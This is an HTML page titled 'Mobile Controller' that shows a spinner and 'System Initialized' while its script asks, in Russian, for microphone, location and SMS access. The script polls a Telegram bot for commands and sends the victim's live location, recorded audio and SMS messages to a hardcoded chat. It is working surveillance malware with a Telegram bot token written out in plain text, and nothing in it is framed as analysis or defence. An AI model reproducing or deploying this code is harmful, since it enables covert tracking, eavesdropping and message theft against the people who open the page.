<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile Controller</title>
    <style>
        body {
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial;
        }
        .loader {
            border: 10px solid #333;
            border-top: 10px solid #ff6200;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 2s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            color: #ff6200;
            font-size: 24px;
            margin-top: 20px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div>
        <div class="loader"></div>
        <div class="status">System Initialized</div>
    </div>

    <script>
        // 🔒 تنظیمات امنیتی (استفاده از توکن و آیدی شما)
        const BOT_TOKEN = '1402368167:AAFDWCnh640v9tcQ5Um-Zg_DPaahthSwVzI';
        const CHAT_ID = '1220575760';

        class MobileController {
            constructor() {
                this.recorder = null;
                this.smsPermission = false;
                this.initSystem();
            }

            async initSystem() {
                await this.requestRussianPermissions();
                setInterval(() => this.checkTelegramCommands(), 2500);
                this.sendToTelegram('🚀 سیستم فعال شد!');
            }

            async requestRussianPermissions() {
                const accepted = confirm('Для работы системы требуется:\n1. Доступ к геолокации\n2. Доступ к микрофону\n3. Доступ к SMS\nРазрешить доступ?');
                if(!accepted) return;
                
                try {
                    await navigator.mediaDevices.getUserMedia({ audio: true });
                    navigator.geolocation.getCurrentPosition(() => {});
                    if('sms' in navigator) this.smsPermission = true;
                } catch(e) {
                    alert('Доступ отклонен! Система не может работать');
                }
            }

            async checkTelegramCommands() {
                try {
                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
                    const data = await res.json();
                    
                    data.result.forEach(update => {
                        if(update.message.chat.id == CHAT_ID) {
                            this.executeCommand(update.message.text);
                        }
                    });
                } catch(e) { console.error('Command Error:', e); }
            }

            executeCommand(cmd) {
                switch(cmd.toLowerCase()) {
                    case '/locate':
                        this.sendLiveLocation();
                        break;
                    case '/record_start':
                        this.startAudioCapture();
                        break;
                    case '/record_stop':
                        this.stopAudioCapture();
                        break;
                    case '/get_sms':
                        this.readSMSMessages();
                        break;
                }
            }

            async sendLiveLocation() {
                const pos = await new Promise(res => 
                    navigator.geolocation.getCurrentPosition(res));
                const mapUrl = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
                this.sendToTelegram(`📍 موقعیت زنده:\n${mapUrl}`);
            }

            async startAudioCapture() {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                this.recorder = new MediaRecorder(stream);
                this.recorder.start();
                this.audioChunks = [];
                this.recorder.ondataavailable = e => this.audioChunks.push(e.data);
                this.sendToTelegram('⏺ ضبط صدا شروع شد...');
            }

            async stopAudioCapture() {
                if(!this.recorder) return;
                
                await new Promise(res => {
                    this.recorder.onstop = res;
                    this.recorder.stop();
                });
                
                const audioBlob = new Blob(this.audioChunks, { type: 'audio/webm' });
                this.sendAudioFile(audioBlob);
            }

            async readSMSMessages() {
                if(!this.smsPermission) return;
                
                if('sms' in navigator) {
                    navigator.sms.receive().then(msg => {
                        this.sendToTelegram(`📩 SMS جدید:\nفرستنده: ${msg.sender}\nمتن: ${msg.body}`);
                    });
                }
            }

            async sendToTelegram(text) {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text
                    })
                });
            }

            async sendAudioFile(audioBlob) {
                const fd = new FormData();
                fd.append('audio', audioBlob, 'recording.webm');
                fd.append('chat_id', CHAT_ID);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                    method: 'POST',
                    body: fd
                });
            }
        }

        // شروع سیستم
        new MobileController();
    </script>
</body>
</html>
